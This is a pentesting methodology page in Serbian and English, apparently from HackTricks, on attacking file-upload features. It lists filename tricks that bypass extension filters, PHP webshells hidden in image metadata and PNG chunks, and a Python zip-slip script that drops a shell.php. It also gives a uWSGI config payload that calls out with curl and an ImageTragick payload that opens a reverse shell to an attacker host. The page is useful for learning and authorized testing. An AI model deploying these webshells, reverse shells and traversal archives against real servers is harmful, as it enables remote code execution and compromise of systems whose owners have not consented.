# Upload fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za Upload fajlova

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako su na snazi, proverite prethodno navedene ekstenzije. Takođe ih testirajte koristeći velika slova: _pHp, .pHP5, .PhAr ..._
2. Proverite dodavanje važeće ekstenzije pre izvršne ekstenzije (koristite prethodno navedene ekstenzije takođe):  
- _file.png.php_  
- _file.png.Php5_
3. Pokušajte da dodate specijalne karaktere na kraj. Možete koristiti Burp za **bruteforce** svih **ascii** i **Unicode** karaktera. (_Napomena: možete takođe pokušati da koristite prethodno pomenute ekstenzije_)  
- _file.php%20_  
- _file.php%0a_  
- _file.php%00_  
- _file.php%0d%0a_  
- _file.php/_  
- _file.php.\\_  
- _file._  
- _file.php...._  
- _file.pHp5...._
4. Pokušajte da zaobiđete zaštite tako što ćete prevariti parser ekstenzija na serveru tehnikama poput dupliranja ekstenzije ili ubacivanja smeća (null bajtova) između ekstenzija. _Možete takođe koristiti prethodne ekstenzije da pripremite bolji payload._  
- _file.png.php_  
- _file.png.pHp5_  
- _file.php#.png_  
- _file.php%00.png_  
- _file.php\x00.png_  
- _file.php%0a.png_  
- _file.php%0d%0a.png_  
- _file.phpJunk123png_
5. Dodajte još jedan sloj ekstenzija na prethodnu proveru:  
- _file.png.jpg.php_  
- _file.php%00.png%00.jpg_
6. Pokušajte da stavite exec ekstenziju pre važeće ekstenzije i nadate se da je server pogrešno konfigurisan. (korisno za eksploatisanje Apache konfiguracionih grešaka gde će bilo šta sa ekstenzijom **.php**, ali ne nužno završeno sa .php, izvršiti kod):  
- _ex: file.php.png_
7. Korišćenje NTFS alternate data stream (ADS) na Windowsu. U tom slučaju, dvotačka ":" će biti ubačena posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, kreiraće se **prazan fajl sa zabranjenom ekstenzijom** na serveru (npr. "file.asax:.jpg"). Ovaj fajl se kasnije može izmeniti drugim tehnikama, kao što je korišćenje njegovog short filename. Šablon "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Dakle, dodavanje tačke posle ovog šablona može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.")
8. Pokušajte da prekoračite limite imena fajla. Važeća ekstenzija se iseca, a zlonamerni PHP ostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Zaobilaženje Content-Type, Magic Number, Compression & Resizing

- Zaobiđite Content-Type provere tako što ćete vrednost Content-Type header-a postaviti na: _image/png_, _text/plain_, _application/octet-stream_  
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite proveru magic number tako što ćete na početak fajla dodati bajtove pravog image fajla (zbunite naredbu _file_). Ili ubacite shell unutar metadata:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili možete direktno ubaciti payload u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se nad vašu sliku primenjuje kompresija, na primer koristeći neke standardne PHP biblioteke kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike možda neće biti korisne. Međutim, možete koristiti PLTE chunk [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može promeniti dimenzije slike koristeći, na primer, PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možete koristiti IDAT chunk [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za kreiranje payload-a koji **preživi promenu dimenzija slike**, koristeći PHP-GD funkciju `thumbnailImage`. Takođe, možete koristiti tEXt chunk [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Druge provere / trikovi

- Pronađite ranjivost koja omogućava **preimenovanje** već uploadovanog fajla (da promenite ekstenziju).
- Pronađite **Local File Inclusion** ranjivost da izvršite backdoor.
- **Mogući otkrivanje informacija**:
1. Uploadujte **više puta** (i u **isto vreme**) isti fajl sa istim imenom
2. Uploadujte fajl sa imenom fajla ili foldera koji već postoji
3. Upload fajla sa imenom **"." , ".." ili "..."**. Na primer, na Apache-u u **Windows**, ako aplikacija čuva upload-ovane fajlove u "/www/uploads/" direktorijumu, fajl sa imenom "." će kreirati fajl nazvan "uploads" u "/www/" direktorijumu.
4. Upload fajla koji se možda neće lako obrisati kao što je **"…:.jpg"** na **NTFS**. (Windows)
5. Upload fajla na **Windows** sa nevažećim karakterima u imenu kao što su `|<>*?”`. (Windows)
6. Upload fajla na **Windows** koristeći rezervisana (zabranjena) imena kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Pokušajte takođe da uploadujete izvršni fajl (.exe) ili .html (manje sumnjivo) koji će izvršiti kod kada ga žrtva slučajno otvori.

### Specijalni trikovi sa ekstenzijama

Ako pokušavate da uploadujete fajlove na **PHP server**, [pogledajte .htaccess trik za izvršavanje koda](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da uploadujete fajlove na **ASP server**, [pogledajte .config trik za izvršavanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi sa ekstenzijom `.phar` su slični `.jar` za Java, ali za PHP, i mogu se **koristiti kao php fajl** (izvršavajući ga sa php-om, ili uključivanjem u skriptu...).

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import fajlova**, tako da bi, u nekom trenutku, neko mogao dozvoliti da se **ova ekstenzija izvršava**.

## **Jetty RCE**

Ako možete uploadovati XML fajl na Jetty server možete dobiti [RCE zato što se **novi \*.xml i \*.war automatski procesuiraju**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je pomenuto na sledećoj slici, upload-ujte XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljno istraživanje ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti mogu se eksploatisati na uWSGI serverima ako imate mogućnost da izmenite `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magic" varijabli, placeholder-a i operatora. Posebno, '@' operator, korišćen kao `@(filename)`, namenjen je za uključivanje sadržaja fajla. Među raznim podržanim šemama u uWSGI-ju, "exec" shema je posebno moćna, omogućavajući čitanje podataka sa standardnog izlaza procesa. Ova funkcionalnost se može manipulisati u zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl procesuira.

Razmotrite sledeći primer zlonamernog `uwsgi.ini` fajla, koji pokazuje različite sheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service napada) ili datoteka mora biti podešena na auto-reload. Auto-reload funkcija, ako je omogućena, ponovo učitava datoteku u određenim intervalima pri detekciji promena.

Ključno je razumeti labavu prirodu parsiranja konfiguracione datoteke uWSGI-ja. Konkretno, diskutovani payload može biti ubačen u binarnu datoteku (na primer sliku ili PDF), čime se dodatno širi opseg potencijalne eksploatacije.

## **wget File Upload/SSRF Trick**

U nekim slučajevima možete otkriti da server koristi **`wget`** za **preuzimanje fajlova** i da možete **navesti** **URL**. U tim slučajevima, kod može proveravati da li je ekstenzija preuzetih fajlova na whitelist-i kako bi osigurao da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **ova provera se može zaobići.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesters i Bug Hunters u testiranju file upload mehanizama. On koristi razne bug bounty techniques da pojednostavi proces identifikovanja i eksploatisanja ranjivosti, obezbeđujući temeljne procene web aplikacija.

### Corrupting upload indices with snprintf quirks (historical)

Neki legacy upload handleri koji koriste `snprintf()` ili slično da bi sastavili multi-file nizove iz single-file uploada mogu biti prevareni da falsifikuju strukturu `_FILES`. Zbog nekonzistentnosti i skraćivanja u ponašanju `snprintf()`, pažljivo konstruisan pojedinačni upload može izgledati kao više indeksiranih fajlova na serverskoj strani, zbunjujući logiku koja pretpostavlja strogi oblik (npr. tretira ga kao multi-file upload i ulazi u nesigurne grane). Iako danas retko, ovaj obrazac “index corruption” povremeno se pojavljuje u CTF-ovima i starijim kod bazama.

## From File upload to other vulnerabilities

- Postavi **filename** na `../../../tmp/lol.png` i pokušaj da postigneš **path traversal**
- Postavi **filename** na `sleep(10)-- -.jpg` i možda ćeš moći da postigneš **SQL injection**
- Postavi **filename** na `<svg onload=alert(document.domain)>` da postigneš **XSS**
- Postavi **filename** na `; sleep 10;` da testiraš neku command injection (više [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Isprobaj **different svg payloads** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ako možeš naterati web server da preuzme sliku sa URL-a, možeš pokušati da zloupotrebiš [SSRF](../ssrf-server-side-request-forgery/index.html). Ako će ta **image** biti **saved** na nekom **public** sajtu, možeš takođe navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specijalno oblikovani PDF-ovi za XSS: [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Ako možeš upload-ovati PDF-ove, mogao bi pripremiti PDF koji će izvršiti proizvoljan JS prateći date instrukcije.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content da proveriš da li server ima neki **antivirus**
- Proveri da li postoji neko **size limit** pri uploadu fajlova

Evo top 10 liste stvari koje možeš postići upload-ovanjem (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Ako možeš upload-ovati ZIP koji će biti dekompresovan na serveru, možeš uraditi 2 stvari:

### Symlink

Upload-uj arhivu koja sadrži soft linkove ka drugim fajlovima; pristupanjem dekompresovanim fajlovima ćeš dobiti pristup linkovanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresovanje u različite direktorijume

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Iako se na prvi pogled može pretpostaviti da ovakvo podešavanje štiti od izvršavanja OS-level komandi putem zlonamernih upload-ovanih fajlova, hijerarhijska podrška za kompresovane arhive i mogućnosti directory traversal u ZIP archive format-u mogu se iskoristiti. To napadačima omogućava da zaobiđu ograničenja i pobegnu iz sigurnih direktorijuma za upload manipulacijom funkcije dekompresije ciljne aplikacije.

Automatizovani exploit za kreiranje takvih fajlova dostupan je na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **symlink trick with evilarc** je opcija. Ako je cilj da se targetuje fajl kao što je `/flag.txt`, treba kreirati symlink ka tom fajlu na vašem sistemu. To obezbeđuje da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicioznog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za dodatne informacije **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Kreiranje PHP Shell-a**: PHP kod koji izvršava komande prosleđene kroz promenljivu `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying i kreiranje kompresovanog fajla**: Kreira se više fajlova i sastavlja se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Izmena pomoću Hex Editora ili vi**: Nazivi fajlova unutar zip-a se menjaju pomoću vi ili hex editora, zamenjujući "xxA" sa "../" radi traversiranja direktorijuma.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Otpremite ovaj sadržaj sa image ekstenzijom da biste iskoristili ranjivost **(ImageMagick, 7.0.1-1)** (pogledajte [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ubacivanje PHP shell-a u PNG

Ubacivanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, pošto se obično koriste za promenu veličine i resampling slika. Sposobnost ugrađenog PHP shell-a da ostane neizmenjen nakon ovih operacija predstavlja značajnu prednost u određenim slučajevima upotrebe.

Detaljna analiza ove tehnike, uključujući metodologiju i potencijalne primene, predstavljena je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot fajlovi

Polyglot fajlovi predstavljaju jedinstven alat u sajber bezbednosti, ponašajući se kao kameleon koji može istovremeno validno postojati u više formata fajlova. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovu kombinaciju; kombinacije poput GIF i JS ili PPT i JS su takođe moguće.

Osnovna upotrebljivost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje proveravaju fajlove na osnovu tipa. Uobičajena praksa u mnogim aplikacijama je dozvoljavanje samo određenih tipova fajlova za upload — poput JPEG, GIF ili DOC — kako bi se smanjio rizik od potencijalno opasnih formata (npr. JS, PHP ili Phar fajlovi). Međutim, polyglot, usklađujući se sa strukturnim kriterijumima više tipova fajlova, može tiho zaobići ova ograničenja.

Uprkos svojoj prilagodljivosti, polygloti imaju ograničenja. Na primer, iako polyglot može istovremeno sadržati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog upload-a može zavisiti od politike platforme u vezi sa ekstenzijama fajlova. Ako je sistem strogo ograničen po pitanju dozvoljenih ekstenzija, sama strukturna dvojnica polyglota možda neće biti dovoljna da garantuje njegov upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Otpremanje validnih JSON fajlova kao da su PDF

Kako izbeći detekciju tipa fajla tako što ćete otpremiti validan JSON fajl čak i ako nije dozvoljen, falsifikujući ga kao PDF (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
- **`pdflib` library**: Dodajte lažni PDF format unutar jednog polja JSON-a tako da biblioteka pomisli da je u pitanju PDF (pogledati primer u postu)
- **`file` binary**: Može pročitati do 1048576 bajtova iz fajla. Jednostavno napravite JSON veći od toga tako da ne može da parsira sadržaj kao JSON, a zatim unutar JSON-a stavite početni deo pravog PDF-a i on će pomisliti da je PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
